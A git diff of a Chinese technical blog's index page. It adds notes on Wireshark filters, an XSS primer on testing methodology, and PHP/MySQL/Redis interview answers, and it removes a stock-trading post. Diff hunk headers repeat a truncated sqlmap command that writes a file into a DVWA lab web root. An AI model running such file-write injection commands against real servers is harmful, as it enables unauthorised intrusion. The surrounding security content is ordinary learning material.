+            <p>Wireshark是非常流行的网络封包分析软件，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程各种问题定位 </p>
+<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="过滤条件-input"><a href="#过滤条件-input" class="headerlink" title="过滤条件 input"></a>过滤条件 input</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## No. ：包的编号 ————————————默认wireshark是按照数据包编号从低到高排序，该编号不会发生改变，即使使用了过滤也同样如此</span></span><br><span class="line"><span class="comment">## Time：包的时间戳。时间格式可以自己设置</span></span><br><span class="line"><span class="comment">## Source 和Destination ：包的源地址和目的地址</span></span><br><span class="line"><span class="comment">## Protocol：包的协议类型</span></span><br><span class="line"><span class="comment">## Length：包的长度</span></span><br><span class="line"><span class="comment">## Info：包的附加信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ip过滤 ###</span></span><br><span class="line"><span class="comment">## 关于 192.168.9.167</span></span><br><span class="line">ip.addr == 192.168.9.167</span><br><span class="line"></span><br><span class="line"><span class="comment">## 请求 192.168.9.167 或者 被请求体 17.248.216.65</span></span><br><span class="line">ip.src == 192.168.9.167 or ip.dst == 17.248.216.65</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 握手包 ###</span></span><br><span class="line"><span class="comment"># SYN：Synchronize，用于初始化和建立连接，它同时也用于同步设备之间的序列号（Seq）</span></span><br><span class="line"><span class="comment"># ACK：Acknolowege，向另一方确认它已收到SYN</span></span><br><span class="line"><span class="comment"># Seq：Sequence number，序列号，用于表示曾经发送过数据的字节数+1</span></span><br><span class="line"><span class="comment"># Len：用于表示收到的字节大小，0表示本次没有收到数据</span></span><br><span class="line"><span class="comment"># FIN：用于结束连接</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2133420">https://cloud.tencent.com/developer/article/2133420</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zichliang/p/17477251.html">https://www.cnblogs.com/zichliang/p/17477251.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linyfeng/p/9496126.html">https://www.cnblogs.com/linyfeng/p/9496126.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/sectool/433570.html">https://www.freebuf.com/articles/sectool/433570.html</a></p>
 
         </div>
     
@@ -1208,8 +341,8 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/stock/">
-                股市币市
+            <a href="/2026/09/19/xss/">
+                XSS跨站脚本攻击
             </a>
         </h1>
         <div class="post-info">
@@ -1219,7 +352,7 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
             
             
                 <span class="category">
-                    <a href="/categories/新/">新</a>
+                    <a href="/categories/渗透/">渗透</a>
                 </span>
             
         </div>
@@ -1227,24 +360,31 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     
         <div class="content">
-            <p>本金 </p>
-<p>三折最多</p>
-<p>三折以上就是突发状况</p>
-<p>有信心可以all in 30%</p>
-<pre><code>信心一般可以先 20%
-</code></pre>
-<p>小试牛刀 10% </p>
-<pre><code>补刀 10%
-
-    收回本金 cl 1
-    或者收回补刀的钱 cl 2
-
-开始做空
-</code></pre>
-<p>一定要留补仓 40%</p>
-<p>本金越大 补仓率就要增高</p>
-<p>2&#x2F;24</p>
-<p>2684 200</p>
+            <h1 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h1><p>XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行“服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。</p>
+<blockquote>
+<p>XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：<br>恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。</p>
+</blockquote>
+<ol>
+<li>XSS漏洞出现的原因</li>
+</ol>
+<p>程序对输入和输出的控制不够严格,导致”精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<ol start="2">
+<li>XSS的分类</li>
+</ol>
+<ul>
+<li>反射型XSS或不持久型XSS(中危)</li>
+<li>储存型XSS 或持久型 XSS（高危）</li>
+<li>DOM XSS</li>
+</ul>
+<ol start="3">
+<li>测试方法<br>1、工具扫描：APPscan、AWVS</li>
+</ol>
+<p>2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF</p>
+<p>使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。</p>
+<p>（1）在目标站点上找到输入点,比如查询接口,留言板等;</p>
+<p>（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;</p>
+<p>（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;</p>
+<h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>[引用]<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/421932.html">https://www.freebuf.com/vuls/421932.html</a></p>
 
         </div>
     
@@ -1256,8 +396,475 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/springboot/">
-                Springboot
+            <a href="/2026/09/19/pantesting-note/">
+                渗透笔记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/渗透/">渗透</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/php-interview/">
+                PHP 面试题
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/面试/">面试</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <ul>
+<li><a href="#1">PHP</a><ul>
+<li><a href="#1.1">运行模式</a></li>
+<li><a href="#1.2">Nginx与Apache解析php文件</a></li>
+<li><a href="#1.3">设计模式</a></li>
+<li><a href="#1.4">Session与Cookie</a></li>
+<li><a href="#1.5">闭包</a></li>
+<li><a href="#1.6">单双引号区别</a></li>
+<li><a href="#1.7">include和require的区别</a></li>
+</ul>
+</li>
+<li><a href="#2">PHP优化与高并发</a><ul>
+<li><a href="#2.1">优化方案</a></li>
+<li><a href="#2.2">PSR-4代码规范</a></li>
+<li><a href="#2.3">微服务</a></li>
+<li><a href="#2.4">抽象类与接口区别</a></li>
+<li><a href="#2.5">垃圾回收机制</a></li>
+<li><a href="#2.6">高并发优化</a></li>
+</ul>
+</li>
+<li><a href="#3">Mysql</a><ul>
+<li><a href="#3.1">myisam和innodb区别以及事务四大特性</a></li>
+<li><a href="#3.2">mysql索引</a></li>
+<li><a href="#3.3">主从-分库分表-锁</a></li>
+<li><a href="#3.4">如何定位慢查询</a></li>
+</ul>
+</li>
+<li><a href="#4">MongoDB</a> </li>
+<li><a href="#5">Redis</a><ul>
+<li><a href="#5.1">Redis和Memcache区别</a></li>
+<li><a href="#5.2">Redis常见数据结构</a></li>
+<li><a href="#5.3">Redis缓存雪崩、缓存穿透、缓存击穿</a></li>
+<li><a href="#5.4">Redis淘汰策略</a> </li>
+<li><a href="#5.5">Redis分布式锁怎么实现</a></li>
+<li><a href="#5.6">Redis的持久化机制:RDB-vs-AOF</a></li>
+<li><a href="#5.7">Redis主从哨兵和集群的区别</a></li>
+<li><a href="#5.8">节点扩容不同</a></li>
+</ul>
+</li>
+<li><a href="#6">MQ</a><ul>
+<li><a href="#6.1">RabbitMQ,RocketMQ,Kafka区别</a></li>
+</ul>
+</li>
+<li><a href="#7">服务器&amp;其它方面</a>  <ul>
+<li><a href="#7.1">swoole</a></li>
+<li><a href="#7.2">phpunit</a></li>
+<li><a href="#7.3">php-cs-fixer</a></li>
+<li><a href="#7.4">docker多版本启动共用</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="php面试题"><a href="#php面试题" class="headerlink" title="php面试题"></a>php面试题</h2><h3 id="1">PHP</h3>
+<h4 id="1.1">运行模式</h4>
+
+
+<ul>
+<li>CGI（通用网关接口&#x2F; Common Gateway Interface）</li>
+<li>FastCGI（常驻型CGI &#x2F; Long-Live CGI）lamp</li>
+<li>CLI（命令行运行 &#x2F; Command Line Interface）</li>
+<li>Web模块模式（Apache等Web服务器运行的模式）</li>
+<li>ISAPI（Internet Server Application Program Interface）</li>
+</ul>
+<h4 id="1.2">Nginx与Apache解析php文件</h4>
+
+<ul>
+<li>php是apache的一个模块，必须依靠web服务器才可以运行，在php引擎解析php文件，php引擎将html页面带给web服务器解析并返回客户端</li>
+<li>cgi与fastcgi协议，CGI common gateway interface, CGI缺点，每处理一个请求都要fork一个全新的进程，就有了fastCGI，一个进程内可以处理多个请求</li>
+<li>phpCGI是fastCGI管理器，后面就用了FPM已经集成到了php里(php-fpm进程管理)</li>
+<li>php-fpm监听的事socket文件，nginx通过location将所有php文件交给fpm处理</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">default.conf</span><br><span class="line">location ~ |.php<span class="variable">$&#123;</span></span><br><span class="line"><span class="variable">	include fastcgi_params</span></span><br><span class="line"><span class="variable">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1.3"><a rel="https://refactoringguru.cn/design-patterns/php">设计模式（三大类）</a></h4>
+
+<ul>
+<li>创建型模式共五种：工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式。</li>
+<li>结构型模式共七种：适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式</li>
+<li>行为型模式共十一种：策略模式、模板方法模式、观察者模式、迭代子模式、责任链模式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式</li>
+</ul>
+<h4 id="1.4">Session与Cookie</h4>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cookie 客户端，保存用户信息的一种机制，</span><br><span class="line">Session 服务端，跟踪用户状态，保存用户会话</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有效期上不同</span></span><br><span class="line">Cookie  开发可以通过设置cookie的属性，达到使cookie长期有效的效果。</span><br><span class="line">Session  session依赖于名为JSESSIONID的cookie，而cookie JSESSIONID的过期时间默认为-1，只需关闭窗口该session就会失效，因而session不能达到长期有效的效果</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跨域</span></span><br><span class="line">cookie 支持跨域名访问。</span><br><span class="line">session 不支持跨域名访问。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 什么是CSRF攻击，XSS攻击</span></span><br><span class="line">CSRF （Cross-site request forgery）跨站请求伪造,黑客建立一个伪造网站或发送邮箱带了一个正常URL链接来让正常用户访问，来让正常用户让自己浏览器里的COOKIE权限来执行一些非法请求，</span><br><span class="line">如转账，提权等操作</span><br><span class="line">!! 防范方法有，验证 HTTP Referer 字段；在请求地址中添加 token 并验证</span><br><span class="line"></span><br><span class="line">XSS 主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了</span><br><span class="line">!! 防范方法:通过过滤是针对非法的HTML代码包括单双引号等，使用htmlspecialchars()函数</span><br></pre></td></tr></table></figure>
+
+<h4 id="1.5">闭包</h4>
+内部函数可以访问外部函数
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>() &#123;</span><br><span class="line">  var name = <span class="string">&quot;Mozilla&quot;</span>; // name 是一个被 init 创建的局部变量</span><br><span class="line">  <span class="keyword">function</span> <span class="function"><span class="title">displayName</span></span>() &#123;</span><br><span class="line">    // displayName() 是内部函数，一个闭包</span><br><span class="line">    alert(name); // 使用了父函数中声明的变量</span><br><span class="line">  &#125;</span><br><span class="line">  displayName();</span><br><span class="line">&#125;</span><br><span class="line">init();</span><br></pre></td></tr></table></figure>
+
+<h4 id="1.6">双引号和单引号的区别</h4>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“<span class="variable">$aaa</span>” 解释变量</span><br><span class="line">‘<span class="variable">$ccc</span>’ 不解释变量</span><br></pre></td></tr></table></figure>
+<h4 id="1.7">include和require的区别</h4>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require 首先执行，报错会终止程序</span><br><span class="line">include 如果包含的，报错会提示，继续执行下去</span><br></pre></td></tr></table></figure>
+<h3 id="2">PHP优化与高并发</h3>
+<h4 id="2.1">优化方案</h4>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">unset</span>(); <span class="comment"># 注销那些不用的变量尤其是大数组，以便释放内存</span></span><br><span class="line">2. str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍</span><br><span class="line">3. 尽量不要在<span class="keyword">for</span>循环中使用函数，比如<span class="keyword">for</span> (<span class="variable">$x</span>=0; <span class="variable">$x</span> &lt; count(<span class="variable">$array</span>); <span class="variable">$x</span>)每循环一次都会调用count()函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="2.2">PSR-4代码规范</h4>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">composer如何实现？PSR-4是什么?</span><br><span class="line">1. 自动加载有两种方式（都是php内置的），一种是通过__autoload(),另一种是通过spl_autoload_register()。</span><br><span class="line"></span><br><span class="line">2.PSR是PHP Standards Recommendation的简称,制定的代码规范，简称PSR，是代码开发的事实标准</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="2.3">抽象类与接口区别</h4>
+
+
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>抽象类</th>
+<th>接口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用于声明某一种事物，规范名称、参数，形成模块，未有详细的实现细节</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>通过类来实现相关的细节工作</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>抽象类的抽象方法与接口一样</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>可继承</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>有属性、普通方法、抽象方法</td>
+<td>✅</td>
+<td>❌只有常量</td>
+</tr>
+<tr>
+<td>抽象方法</td>
+<td>❌不一定要有抽象方法</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>语法不同</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>声明不同</td>
+<td>abstract关键字在类前声明，且有class声明为类</td>
+<td>用interface来声明，但不能用class来声明</td>
+</tr>
+<tr>
+<td>继承</td>
+<td>extends关键字让子类继承父类后，在子类实现详细的抽象方法</td>
+<td>用implements让普通类在类里实现接口的详细方法，且接口可以一次性实现多个方法，用逗号分开各个接口就可</td>
+</tr>
+</tbody></table>
+<p>抽象类与接口的结合</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">/* </span><br><span class="line">写此程序源于自己的猜测，想在抽象类里实现某一接口。 </span><br><span class="line">*/ </span><br><span class="line">interface work&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">abstract class a implements work&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">showlove</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;love you&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;hello, i m in b&#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$k</span>=new b(); </span><br><span class="line"><span class="variable">$k</span>- say();</span><br><span class="line">/* </span><br><span class="line">以上程序能正常执行</span><br><span class="line">普通类implements接口后，就变成了抽象类了，这就好像是直接给抽象类增加了一个抽象方法。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+
+<p>接口与继承的结合</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">class a &#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">show</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是父类&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a implements kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是继承A类，同时实现say接口的&lt;br / &#x27;</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=new b(); </span><br><span class="line"><span class="variable">$b</span>- show();//我是父类</span><br><span class="line"><span class="variable">$b</span>- say();//我是继承A类，同时实现say接口的</span><br></pre></td></tr></table></figure>
+
+<h4 id="2.4">微服务</h4>
+
+<p>优势：</p>
+<ul>
+<li>独立开发 – 所有微服务都可以根据各自的功能轻松开发</li>
+<li>独立部署 – 基于其服务，可以在任何应用程序中单独部署它们</li>
+<li>故障隔离 – 即使应用程序的一项服务不起作用，系统仍可继续运行</li>
+<li>混合技术堆栈 – 可以使用不同的语言和技术来构建同一应用程序的不同服务</li>
+<li>粒度缩放 – 单个组件可根据需要进行缩放，无需将所有组件缩放在一起</li>
+</ul>
+<p>特点：</p>
+<ul>
+<li>解耦 – 系统内的服务很大程度上是分离的。因此，整个应用程序可以轻松构建，更改和扩展</li>
+<li>组件化 – 微服务被视为可以轻松更换和升级的独立组件</li>
+<li>业务能力 – 微服务非常简单，专注于单一功能</li>
+<li>自治 – 开发人员和团队可以彼此独立工作，从而提高速度</li>
+<li>持续交付 – 通过软件创建，测试和批准的系统自动化，允许频繁发布软件</li>
+<li>责任 – 微服务不关注应用程序作为项目。相反，他们将应用程序视为他们负责的产品</li>
+<li>分散治理 – 重点是使用正确的工具来做正确的工作。这意味着没有标准化模式或任何技术模式。开发人员可以自由选择最有用的工具来解决他们的问题</li>
+<li>敏捷 – 微服务支持敏捷开发。任何新功能都可以快速开发并再次丢弃</li>
+</ul>
+<h4 id="2.5">垃圾回收机制</h4>
+
+<ul>
+<li>PHP垃圾回收机制</li>
+</ul>
+<p><code>PHP5.3版本</code>之前,使用的垃圾回收机制是单纯的“引用计数”<br>但是当两个或多个对象互相引用形成环状后，内存对象的计数器则不会消减为0,<br>这一组内存对象已经没用了，但是不能回收，从而导致内存泄露的现象<br>每个php变量存在一个叫”zval”的变量容器中。一个zval变量容器，除了包含变量的类型和值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug_debug_zval( <span class="string">&#x27;a&#x27;</span> ); <span class="comment"># Xdebug来检查引用计数情况</span></span><br></pre></td></tr></table></figure>
+<p>从<code>PHP7的NTS版本</code>开始，以上例程的引用将不再被计数<br>对于null，bool，int和double的类型变量，refcount永远不会计数；<br>对于对象、资源类型，refcount计数和php5的一致；<br>字符串引用，计数不变，&amp;地址发生改变<br>数组引用，键值不变的情况下计数<br>改变后引用全部作废，重新计算</p>
+<ul>
+<li>回收周期</li>
+</ul>
+<p><code>zend.enable_gc</code><code>php.ini</code>默认是打开的</p>
+<ul>
+<li>性能影响</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/benbenhan/articles/15904812.html">https://www.cnblogs.com/benbenhan/articles/15904812.html</a><br><a target="_blank" rel="noopener" href="https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html">https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=DRiKKpc8Q7W4D">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRiKKpc8Q7W4D</a></p>
+<h4 id="2.6">高并发优化</h4>
+
+<ul>
+<li>流量优化 - 防盗链处理</li>
+<li>前端优化<ol>
+<li>减少http请求次数</li>
+<li>添加异步请求</li>
+<li>启用浏览器缓存和文件压缩</li>
+<li>CDN加速</li>
+<li>建立独立的图片服务器(减少I&#x2F;O)</li>
+</ol>
+</li>
+<li>服务端优化<ol>
+<li>页面静态化</li>
+<li>并发处理</li>
+<li>队列处理</li>
+</ol>
+</li>
+<li>数据库优化<ol>
+<li>数据库缓存</li>
+<li>分库分表,分区</li>
+<li>读写分离</li>
+<li>负载均衡</li>
+</ol>
+</li>
+<li>web服务器优化<ol>
+<li>nginx反向代理实现负载均衡</li>
+<li>lvs实现负载均衡</li>
+</ol>
+</li>
+</ul>
+<h3 id="3">Mysql</h3>
+<h4 id="3.1">myisam和innodb区别以及事务四大特性</h4>
+
+<h4 id="3.2">mysql索引</h4>
+
+<blockquote>
+<p>从数据结构角度</p>
+</blockquote>
+<ul>
+<li>B+树索引(O(log(n)))：关于B+树索引，可以参考 MySQL索引背后的数据结构及算法原理</li>
+<li>hash索引：</li>
+</ul>
+<blockquote>
+<p>从物理存储角度</p>
+</blockquote>
+<ul>
+<li>聚集索引（clustered index）</li>
+<li>非聚集索引（non-clustered index）</li>
+</ul>
+<blockquote>
+<p>从逻辑角度</p>
+</blockquote>
+<ul>
+<li>主键索引：主键索引是一种特殊的唯一索引，不允许有空值</li>
+<li>普通索引或者单列索引</li>
+<li>多列索引（复合索引）：复合索引指多个字段上创建的索引，只有在查询条件中使用了创建索引时的第一个字段，索引才会被使用。使用复合索引时遵循最左前缀集合</li>
+<li>唯一索引或者非唯一索引</li>
+<li>空间索引：空间索引是对空间数据类型的字段建立的索引</li>
+</ul>
+<h4 id="3.3">主从-分区分表分库</h4>
+
+<ul>
+<li>分库：是为了解决数据库连接资源不足问题，和磁盘IO的性能瓶颈问题。</li>
+<li>分表：是为了解决单表数据量太大，sql语句查询数据时，即使走了索引也非常耗时问题。此外还可以解决消耗cpu资源问题。</li>
+<li>分库分表：可以解决 数据库连接资源不足、磁盘IO的性能瓶颈、检索数据耗时 和 消耗cpu资源等问题。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md">https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md</a></p>
+<h4 id="3.4">如何定位慢查询</h4>
+
+<ol>
+<li>首先确认是否开启了慢查询</li>
+<li>设置慢查询的时间限制</li>
+<li>查询慢查询日志可定位具体的慢sql</li>
+<li>相关sql查询</li>
+<li>用Explain分析具体的sql语句</li>
+</ol>
+<h3 id="5">Redis</h3>
+<h4 id="5.2">Redis常见数据结构</h4>
+
+<p>最常用的的有5种,字符串(String)、哈希(Hash)、列表(list)、集合(set)、有序集合(ZSET)</p>
+<blockquote>
+<p>元素唯一性：set中不允许重复的成员，而zset中不允许重复的成员，但是允许不同成员拥有相同的分数</p>
+</blockquote>
+<h4 id="5.3">Redis缓存雪崩、缓存穿透、缓存击穿</h4>
+
+
+<ul>
+<li><p>缓存雪崩<br>大量用户请求，全部转向请求访问数据库，压力剧增，可能导致数据库宕机，造成系统崩溃，造成缓存雪崩</p>
+</li>
+<li><p>缓存击穿<br>业务中几个数据会频繁访问，比如秒杀数据，被称为热点数据<br>如果某个热点数据过期了，此时大量用户请求，无法从缓存中读取，直接访问数据库，造成系统奔溃，缓存击穿</p>
+</li>
+<li><p>缓存穿透<br>当用户访问数据，既不在缓存中，也不在数据库，导致请求缓存时，发现缓存缺失，发现两者都没找到，没法构建缓存，</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>缓存异常</th>
+<th>产生原因</th>
+<th>应对方案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>缓存雪崩</td>
+<td>大量数据同时过期</td>
+<td>1.均匀设置过期时间 - 过期时间后加随机数，保证不会再同一时间过期 </br>  2.互斥锁 - 保证同一时间只有一个请求来构建缓存 </br> 3.后台更新缓存</td>
+</tr>
+<tr>
+<td></td>
+<td>Redis 故障宕机</td>
+<td>1.服务熔断或请求限流机制 </br>  2.构建 Redis 缓存高可靠集群</td>
+</tr>
+<tr>
+<td>缓存击穿</td>
+<td>热点数据过期</td>
+<td>1.互斥锁 </br> 2.不给热点数据设置过期时间，由后台异步更新缓存</td>
+</tr>
+<tr>
+<td>缓存穿透</td>
+<td>访问的数据既不在缓存，也不在数据库</td>
+<td>1.非法请求 </br> 2.缓存空值或者默认值 </br> 3.使用布隆过滤器快速判断数据是否存在</td>
+</tr>
+</tbody></table>
+<h4 id="5.4">Redis淘汰策略</h4>
+<h4 id="5.5">Redis分布式锁怎么实现</h4>
+<h4 id="5.6">Redis的持久化机制:RDB-vs-AOF</h4>
+<h4 id="5.7">Redis主从哨兵和集群的区别</h4>
+<h4 id="5.8">节点扩容不同</h4>
+
+
+<h3 id="6">MQ</h3>
+<h4 id="6.1">RabbitMQ,RocketMQ,Kafka区别</h4>
+
+
+<table>
+<thead>
+<tr>
+<th>MQ消息队列</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RabbitMQ</td>
+<td>轻量级、容易部署和使用、支持多种客户端开发语言、支持灵活的路由配置</td>
+<td>对消息堆积的支持并不好、性能和吞吐量较差、使用 Erlang 语言编写，比较难进行二次开发</td>
+</tr>
+<tr>
